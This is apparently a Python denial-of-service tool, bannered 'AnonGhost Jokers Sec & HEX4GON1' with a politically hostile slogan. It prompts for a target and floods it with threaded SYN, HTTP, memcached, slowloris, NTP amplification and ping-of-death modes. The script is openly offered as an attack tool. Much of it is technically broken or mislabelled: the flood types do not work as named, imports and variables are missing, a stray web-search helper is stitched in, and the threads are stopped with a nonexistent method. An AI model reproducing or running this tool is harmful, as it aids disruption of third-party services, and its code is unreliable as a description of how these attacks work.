import socket
import random
import sys
import requests
import string
import time
import threading

# ANSI escape codes for color
PURPLE = '\033[95m'
END_COLOR = '\033[0m'

def print_banner(text, description):
    banner = f"{PURPLE}##############################\n{text}\n##############################\n{description}{END_COLOR}"
    print(banner)

# Call the print_banner function
print_banner("Welcome To AnonGhost Jokers Sec & HEX4GON1", "WE ARE CYBER DEFENSE AGAINST ZIONISTS")

# Supported attack methods
attack_methods = {
    "syn": "SYN Flood",
    "http": "HTTP Flood",
    "memcached": "Memcached Flood",
    "slowloris": "Slowloris",
    "ntp": "NTP Amplification",
    "pod": "Ping of Death"
}

# List of user agents
user_agents = [
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10",
    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28",
    "Mozilla/5.0 (Windows; U; Windows XP; en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/534.12",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) BehindID/7.0.921 Safari/537.36",
    "Mozilla/5.0 (Windows; U; Windows XP; fr-FR) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.91 Safari/534.14",
    "Mozilla/5.0 (Windows; U; Windows XP; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
    "Mozilla/5.0 (X11; U; Debian i686; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3",
    "Mozilla/5.0 (Windows; U; Windows XP; de-DE) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.652.168 Safari/534.17",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_4) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.652.166 Safari/534.17",
    "Mozilla/5.0 (X11; U; Fedora; en-US; rv:1.9.2.21) Gecko/20110801 Firefox/3.6.21"
]


# Get a random user agent
def get_random_user_agents():
  return random. choice(user_agents)

# Make a GET request to the specified URL
def make_get_request(url):
  headers = {
    'User-Agents': get_random_user_agents()
  }

  response = requests.get(url,headers=headers)

  return response.text

# Search for a query in the internet
def search_in_internet(query):
  # Make a GET request to Google search
  response = make_get_request(f'https://google.com/search?q={query}')

  # Parse the search results
  search_results = []
  soup = BeautifulSoup(response)
  for result in search_results:
    title = result.find('h3').text
    link = result.find('a')['href']
    search_results.append({
      'title': title,
      'link': link
    })

  return search_result

# Print the search results
def print_search_results(search_results):
  for result in search_results:
    print(f'Title: {result["title"]}')
    print(f'Link: {result["link"]}')

# Get the target information
target_host = input("Enter the target IP/URL: ")
target_port = int(input("Enter the target port (optional, default is 80): ") or 80)

# Get the attack method
while True:
    attack_method = input(f"Choose an attack method ({', '.join(attack_methods.keys())}): ").lower()
    if attack_method in attack_methods:
        break
    else:
        print("Invalid attack method. Please choose one from the list.")

# Get the number of threads
num_threads = int(input("Enter the number of threads (optional, default is 1): ") or 1)

# Create a socket for the selected attack method
if attack_method in ["syn", "http", "memcached", "slowloris"]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
elif attack_method == "ntp":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
elif attack_method == "pod":
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# Connect to the target (if necessary)
if attack_method in ["syn", "http", "memcached", "slowloris"]:
    sock.connect((target_host, target_port))

# Function to send SYN packets (SYN Flood)
def syn_flood():
    while True:
        sock.send(b"\x50\x05\x00\x00")

# Function to send HTTP GET requests (HTTP Flood)
def http_flood():
    while True:
        sock.send(b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\nConnection: keep-alive\r\n\r\n")

# Function to send UDP packets to memcached servers (Memcached Flood)
def memcached_flood():
    while True:
        sock.sendto(b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n", (target_host, 11211))

# Function to send slowloris packets (Slowloris)
def slowloris():
    while True:
        sock.send(b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n")
        for _ in range(1000):
            sock.send(b"X-a: b\r\n")

# Function to send NTP packets (NTP Amplification)
def ntp_amplification():
    while True:
        sock.sendto(b"\x17\x00\x03\x2a\x00\x00\x00\x00", (target_host, 123))

# Function to send Ping of Death packets (Ping of Death)
def pod():
    while True:
        packet = b"\x45" * 65500
        sock.sendto(packet, (target_host, 0))

# Create a list of threads
threads = []

# Create threads for each attack method
for i in range(num_threads):
    if attack_method == "syn":
        thread = threading.Thread(target=syn_flood)
    elif attack_method == "http":
        thread = threading.Thread(target=http_flood)
    elif attack_method == "memcached":
        thread = threading.Thread(target=memcached_flood)
    elif attack_method == "slowloris":
        thread = threading.Thread(target=slowloris)
    elif attack_method == "ntp":
        thread = threading.Thread(target=ntp_amplification)
    elif attack_method == "pod":
        thread = threading.Thread(target=pod)
    threads.append(thread)

# Start the threads
for thread in threads:
    thread.start()

# Wait for the user to press any key to stop the attack
input("Press Ctrl+C to stop the attack...")

# Stop the threads
for thread in threads:
    thread.stop()

# Print "Attack stopped."
print("Attack stopped.")
